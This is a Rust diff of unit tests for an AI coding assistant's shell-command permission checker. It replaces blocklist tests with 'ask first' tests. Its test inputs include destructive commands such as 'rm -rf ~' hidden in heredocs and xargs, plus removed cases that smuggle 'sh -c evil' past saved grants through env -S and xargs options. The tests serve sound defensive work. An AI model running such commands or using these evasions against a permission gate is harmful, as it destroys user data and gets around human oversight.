-            PolicyResult::Block { .. }
-        )
-    }
-
     #[test]
-    fn blocklist_sees_the_command_an_argument_runner_runs() {
-        for exec in [
-            full_execution_config(&["rm"]),
-            restricted_execution_config(&[], &["rm"]),
+    fn ask_first_sees_the_command_an_argument_runner_runs() {
+        for (exec, asks) in [
+            (full_execution_config(&["rm"]), false),
+            (ask_first_config(&["rm"]), true),
         ] {
             for command in [
                 "find . | xargs rm -f",
@@ -3705,42 +2373,34 @@ mod tests {
                 "xargs rm",
                 "timeout 5 rm x",
             ] {
-                assert!(is_block(&exec, command), "{command} must be blocked");
+                assert_eq!(asks_first(&exec, command), asks, "{command} must ask first");
             }
         }
     }
 
     #[test]
-    fn argument_runners_without_a_blocked_command_stay_named() {
+    fn argument_runners_without_a_listed_command_run() {
         let exec = full_execution_config(&["rm"]);
         for command in ["exec >log 2>&1", "xargs grep foo", "watch -n 2 ls"] {
             assert!(
                 matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
+                    evaluate_command_policy(&exec, command, &[]),
                     PolicyResult::Allow
                 ),
                 "{command}"
             );
         }
-        let exec = restricted_execution_config(&[], &["rm"]);
-        for (command, prefix) in [
-            ("exec >log 2>&1", ""),
-            ("xargs grep foo", "xargs grep"),
-            ("watch -n 2 ls", "watch"),
-        ] {
-            assert_eq!(
-                approval_texts(&exec, command),
-                vec![(command.to_string(), prefix.to_string())],
-                "{command}"
-            );
+        let exec = ask_first_config(&["rm"]);
+        for command in ["exec >log 2>&1", "xargs grep foo", "watch -n 2 ls"] {
+            assert!(!asks_first(&exec, command), "{command}");
         }
     }
 
     #[test]
-    fn blocklist_sees_commands_an_unquoted_heredoc_body_runs() {
-        for exec in [
-            full_execution_config(&["rm"]),
-            restricted_execution_config(&[], &["rm"]),
+    fn ask_first_sees_commands_an_unquoted_heredoc_body_runs() {
+        for (exec, asks) in [
+            (full_execution_config(&["rm"]), false),
+            (ask_first_config(&["rm"]), true),
         ] {
             for command in [
                 "cat <<EOF\n${x:-$(rm -rf ~)}\nEOF",
@@ -3749,180 +2409,34 @@ mod tests {
                 "cat <<EOF\n$(echo `rm a`)\nEOF",
                 "cat <<EOF\n`echo \\`rm a\\``\nEOF",
             ] {
-                assert!(is_block(&exec, command), "{command:?} must be blocked");
+                assert_eq!(
+                    asks_first(&exec, command),
+                    asks,
+                    "{command:?} must ask first"
+                );
             }
         }
     }
 
     #[test]
-    fn quoted_heredoc_body_runs_nothing_the_blocklist_sees() {
+    fn quoted_heredoc_body_runs_nothing_ask_first_sees() {
         let command = "cat <<'EOF'\n`rm x` $(rm y)\nEOF";
-        assert!(!is_block(&full_execution_config(&["rm"]), command));
-        let exec = restricted_execution_config(&[], &["rm"]);
-        assert_eq!(
-            approval_texts(&exec, command),
-            vec![(command.to_string(), "cat".to_string())]
-        );
+        assert!(!asks_first(&full_execution_config(&["rm"]), command));
+        assert!(!asks_first(&ask_first_config(&["rm"]), command));
     }
 
     #[test]
     fn command_lookup_is_not_the_command_it_names() {
-        for exec in [
-            full_execution_config(&["rm"]),
-            restricted_execution_config(&[], &["rm"]),
+        for (exec, asks) in [
+            (full_execution_config(&["rm"]), false),
+            (ask_first_config(&["rm"]), true),
         ] {
             for command in ["command -v rm", "command -V rm", "command -pv rm"] {
-                assert!(!is_block(&exec, command), "{command} only looks rm up");
+                assert!(!asks_first(&exec, command), "{command} only looks rm up");
             }
             for command in ["command rm x", "command -p rm x"] {
-                assert!(is_block(&exec, command), "{command} runs rm");
+                assert_eq!(asks_first(&exec, command), asks, "{command} runs rm");
             }
-        }
-    }
-
-    #[test]
-    fn every_suggested_prefix_covers_the_row_it_came_from() {
-        // Saving the suggested prefix must allow the command it was
-        // suggested for, or the user is asked again for the same row.
-        for command in [
-            "bash -lc 'echo hi'",
-            "bash -ec 'echo hi'",
-            "perl -ne 'print'",
-            "python3 -W ignore x.py",
-            "python3 -X dev x.py",
-            "bash -o pipefail s.sh",
-            "python3 -W ignore -m pytest -q",
-            "python3 -m pytest -q",
-            "bash tools/check-links.sh",
-            ". ./setup.sh",
-            "source ./setup.sh",
-            "command -v rm",
-            "xargs grep foo",
-            "xargs -n 1 grep foo",
-            "xargs -I {} grep foo {}",
-            "xargs git -C x push",
-            "watch -n 2 ls",
-            "exec cargo test",
-            "FOO=1 command -v rm",
-            "timeout 5 command -v rm",
-            "env -i command -v rm",
-            "command -p -v rm",
-            "xargs -0 command -v",
-            "xargs -0I grep echo RAN",
-            "xargs -rI grep echo RAN",
-            "xargs -0n 1 grep foo",
-            "exec -la grep echo RAN",
-            "env -iu FOO cargo build",
-            "cat <<EOF > notes.md\nuse `ls` here\nEOF",
-            "xargs --max-lines grep foo",
-            "xargs --max-lines=2 -E x grep foo",
-            "xargs -I {} git push {}",
-            "xargs -i git push {}",
-            "xargs --replace=% git push origin %",
-            "xargs -I % sh -c 'echo %'",
-            "taskset 1 grep x",
-            "taskset -c 0,1 grep x",
-            "chrt -f 10 grep x",
-            "chrt -o grep x",
-            "chrt 10 -- grep x",
-        ] {
-            let rows = approval_texts(&restricted_execution_config(&[], &[]), command);
-            let prefixes: Vec<&str> = rows.iter().map(|(_, p)| p.as_str()).collect();
-            assert!(
-                prefixes.iter().all(|p| !p.is_empty()),
-                "{command:?}: {rows:?}"
-            );
-            let exec = restricted_execution_config(&prefixes, &[]);
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::Allow
-                ),
-                "{command:?} is asked again after saving {prefixes:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn argument_runner_rows_suggest_the_runner_and_the_command_it_runs() {
-        // `xargs` and `exec` name the command they run, without their own
-        // options; `eval` and `watch` run code, so only the runner is named.
-        for (command, expected) in [
-            ("xargs -n 1 grep foo", "xargs grep"),
-            ("xargs -I {} grep foo {}", "xargs grep"),
-            ("xargs grep foo", "xargs grep"),
-            ("xargs git push", "xargs git push"),
-            ("xargs git -C x push", "xargs git push"),
-            ("xargs -0I grep echo RAN", "xargs echo"),
-            ("xargs -0n 1 grep foo", "xargs grep"),
-            ("exec -la grep echo RAN", "exec echo"),
-            ("exec cargo test", "exec cargo test"),
-            ("watch -n 2 ls", "watch"),
-            ("eval ls", "eval"),
-        ] {
-            assert_eq!(
-                approval_texts(&restricted_execution_config(&[], &[]), command),
-                vec![(command.to_string(), expected.to_string())],
-                "{command}"
-            );
-        }
-    }
-
-    #[test]
-    fn saved_argument_runner_prefix_covers_only_the_command_it_names() {
-        let exec = restricted_execution_config(&["xargs grep"], &[]);
-        for command in ["xargs -n 1 grep foo", "xargs -I {} grep foo {}"] {
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::Allow
-                ),
-                "{command} runs grep"
-            );
-        }
-        for command in ["xargs sh -c 'x'", "xargs cat", "xargs -n 1 cat"] {
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::NeedsApproval(_)
-                ),
-                "{command} does not run grep"
-            );
-        }
-    }
-    #[test]
-    fn runner_without_a_command_offers_only_its_exact_text() {
-        // A saved `xargs` or `exec` would allow every command after it.
-        let exec = restricted_execution_config(&[], &[]);
-        for command in [
-            "xargs",
-            "exec >log 2>&1",
-            "exec 3>&1",
-            "xargs -0",
-            "exec -a name",
-        ] {
-            let PolicyResult::NeedsApproval(rows) =
-                evaluate_command_policy(&exec, command, &[], &[])
-            else {
-                panic!("expected approval for {command:?}");
-            };
-            assert_eq!(rows.len(), 1, "{command:?}");
-            assert_eq!(rows[0].suggested_prefix, "", "{command:?}");
-            let once: Vec<RunCommandGrant> = rows.iter().map(once_grant).collect();
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &once, &[]),
-                    PolicyResult::Allow
-                ),
-                "{command:?}"
-            );
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, &format!("{command} rm -rf x"), &once, &[]),
-                    PolicyResult::NeedsApproval(_)
-                ),
-                "allowing {command:?} once must not allow running rm through it"
-            );
         }
     }
 
@@ -3931,33 +2445,9 @@ mod tests {
         // `xargs -0I grep echo RAN` runs `echo` with `grep` as the replace
         // string, `exec -la grep echo RAN` runs `echo` named `grep`, and
         // `xargs --process grep` abbreviates `--process-slot-var grep`.
-        for (grant, command) in [
-            ("xargs grep", "xargs -0I grep sh -c evil"),
-            ("xargs grep", "xargs -rI grep sh -c evil"),
-            ("xargs grep", "xargs --process grep sh -c evil"),
-            ("xargs grep", "xargs -J % sh -c evil"),
-            ("exec grep", "exec -la grep sh -c evil"),
-            ("FOO", "env -iu FOO sh -c evil"),
-        ] {
-            let exec = restricted_execution_config(&[grant], &[]);
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::NeedsApproval(_)
-                ),
-                "a saved {grant:?} must not allow {command:?}"
-            );
-        }
-        // An option the table does not list as written may take the next
-        // word, so no prefix names the command after it.
-        let exec = restricted_execution_config(&[], &[]);
-        assert_eq!(
-            approval_texts(&exec, "xargs --process grep echo RAN"),
-            vec![("xargs --process grep echo RAN".to_string(), String::new())]
-        );
-        for exec in [
-            full_execution_config(&["rm"]),
-            restricted_execution_config(&[], &["rm"]),
+        for (exec, asks) in [
+            (full_execution_config(&["rm"]), false),
+            (ask_first_config(&["rm"]), true),
         ] {
             for command in [
                 "xargs -0n 1 rm -rf x",
@@ -3972,98 +2462,16 @@ mod tests {
                 "timeout -sKILL 5 rm -rf x",
                 "timeout --pres 5 rm -rf x",
             ] {
-                assert!(is_block(&exec, command), "{command} must be blocked");
+                assert_eq!(asks_first(&exec, command), asks, "{command} must ask first");
             }
         }
     }
 
     #[test]
-    fn saved_grant_never_covers_a_command_an_option_hides() {
-        // GNU `xargs --max-lines[=N]` takes a value only after `=`, xargs
-        // writes its input over a replace string wherever it occurs in the
-        // command, and `env -S` splits its value into the command's start.
-        for (grant, command) in [
-            ("xargs grep", "xargs --max-lines -I grep sh -c evil"),
-            ("xargs grep", "xargs --max-lines -E grep sh -c evil"),
-            ("xargs git push", "xargs -I push git push --hard"),
-            ("xargs git push", "xargs -Ipush git push --hard"),
-            ("xargs git push", "xargs -ipush git push --hard"),
-            ("xargs git push", "xargs --replace=push git push --hard"),
-            ("xargs git push", "xargs -I 'push' git push --hard"),
-            ("xargs git push", "xargs -I u git pu''sh --hard"),
-            ("xargs git push", "xargs -i git -C {} push --hard"),
-            ("grep", "env -S'sh -c evil' grep x"),
-            ("grep", "env -Ssh grep x"),
-            ("grep", "env -S 'sh -c evil' grep x"),
-            ("grep", "env -iS'sh -c evil' grep x"),
-            ("grep", "env --split-string='sh -c evil' grep x"),
-            ("grep", "env --sp='sh -c evil' grep x"),
-            ("grep", "taskset 1 sh -c evil"),
-        ] {
-            let exec = restricted_execution_config(&[grant], &[]);
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::NeedsApproval(_)
-                ),
-                "a saved {grant:?} must not allow {command:?}"
-            );
-        }
-        for (grant, command) in [
-            ("xargs git push", "xargs -I {} git push {}"),
-            ("xargs git push", "xargs --replace git push origin {}"),
-            ("xargs grep", "xargs --max-lines grep foo"),
-            ("grep", "taskset 1 grep x"),
-            ("grep", "taskset 0x3 grep x"),
-            ("grep", "chrt -f 10 grep x"),
-            ("grep", "chrt 10 -- grep x"),
-        ] {
-            let exec = restricted_execution_config(&[grant], &[]);
-            assert!(
-                matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
-                    PolicyResult::Allow
-                ),
-                "a saved {grant:?} allows {command:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn options_that_hide_the_command_suggest_no_prefix() {
-        let exec = restricted_execution_config(&[], &[]);
-        for (command, prefix) in [
-            ("xargs -I push git push --hard", ""),
-            ("xargs -I {} git {} --hard", ""),
-            ("xargs -I 'grep' grep x", ""),
-            ("xargs -I '' grep x", ""),
-            ("xargs -I {} grep x {}", "xargs grep"),
-            ("env -S'grep x' y", ""),
-            ("env --split-string=grep y", ""),
-            ("env -iSgrep y", ""),
-            ("xargs --frob grep x", ""),
-            ("xargs --frob=1 grep x", ""),
-            ("xargs --max-l grep x", ""),
-            ("xargs -Z grep x", ""),
-            ("env --sp=x grep", ""),
-            ("xargs --max-lines grep foo", "xargs grep"),
-            ("taskset 1 grep x", "grep"),
-            ("chrt -f 10 grep x", "grep"),
-            ("chrt -o grep x", "grep"),
-        ] {
-            assert_eq!(
-                approval_texts(&exec, command),
-                vec![(command.to_string(), prefix.to_string())],
-                "{command}"
-            );
-        }
-    }
-
-    #[test]
-    fn blocklist_sees_a_command_under_every_reading_of_runner_options() {
-        for exec in [
-            full_execution_config(&["rm"]),
-            restricted_execution_config(&[], &["rm"]),
+    fn ask_first_sees_a_command_under_every_reading_of_runner_options() {
+        for (exec, asks) in [
+            (full_execution_config(&["rm"]), false),
+            (ask_first_config(&["rm"]), true),
         ] {
             for command in [
                 "xargs --max-lines rm -rf x",
@@ -4093,11 +2501,11 @@ mod tests {
                 "chrt -o rm x",
                 "chrt 10 -- rm x",
             ] {
-                assert!(is_block(&exec, command), "{command} must be blocked");
+                assert_eq!(asks_first(&exec, command), asks, "{command} must ask first");
             }
         }
         // Only a word an option may take is read as the command.
-        let exec = full_execution_config(&["rm"]);
+        let exec = ask_first_config(&["rm"]);
         for command in [
             "xargs -0 git rm x",
             "xargs -n 1 git rm",
@@ -4109,7 +2517,7 @@ mod tests {
         ] {
             assert!(
                 matches!(
-                    evaluate_command_policy(&exec, command, &[], &[]),
+                    evaluate_command_policy(&exec, command, &[]),
                     PolicyResult::Allow
                 ),
                 "{command} runs no rm"
@@ -4118,13 +2526,13 @@ mod tests {
     }
 
     #[test]
-    fn blocklist_sees_a_blocked_subcommand_under_every_reading() {
-        for exec in [
-            full_execution_config(&["git push"]),
-            restricted_execution_config(&[], &["git push"]),
+    fn ask_first_sees_a_listed_subcommand_under_every_reading() {
+        for (exec, asks) in [
+            (full_execution_config(&["git push"]), false),
+            (ask_first_config(&["git push"]), true),
         ] {
             for command in ["xargs -0I git push origin", "env -S'\\_git push'"] {
-                assert!(is_block(&exec, command), "{command} must be blocked");
+                assert_eq!(asks_first(&exec, command), asks, "{command} must ask first");
             }
         }
     }
@@ -4133,28 +2541,26 @@ mod tests {
     fn many_replace_strings_take_linear_time() {
         let command = format!("xargs {}git {}", "-I zq ".repeat(5_000), "w ".repeat(5_000));
         let started = std::time::Instant::now();
-        for exec in [
-            full_execution_config(&["rm"]),
-            restricted_execution_config(&[], &["rm"]),
-        ] {
-            evaluate_command_policy(&exec, &command, &[], &[]);
+        for exec in [full_execution_config(&["rm"]), ask_first_config(&["rm"])] {
+            evaluate_command_policy(&exec, &command, &[]);
         }
         assert!(started.elapsed() < Duration::from_secs(30));
     }
 
     #[test]
     fn deeply_nested_runners_do_not_overflow_the_stack() {
-        use crate::assistant::tools::prefix_detector::{canonicalize_for_allow, suggest_prefix};
         let handle = std::thread::Builder::new()
             .stack_size(2 << 20)
             .spawn(|| {
                 for runner in ["exec ", "nohup "] {
                     let command = format!("{}grep x", runner.repeat(20_000));
-                    assert!(!suggest_prefix(&command).is_empty(), "{runner}");
-                    assert!(canonicalize_for_allow(&command).is_some(), "{runner}");
+                    assert!(
+                        !asks_first(&ask_first_config(&["rm"]), &command),
+                        "{runner}"
+                    );
                 }
                 let command = format!("{}rm x", "exec ".repeat(20_000));
-                assert!(is_block(&full_execution_config(&["rm"]), &command));
+                assert!(asks_first(&ask_first_config(&["rm"]), &command));
             })
             .expect("spawn");
         handle.join().expect("nested runners must not overflow");
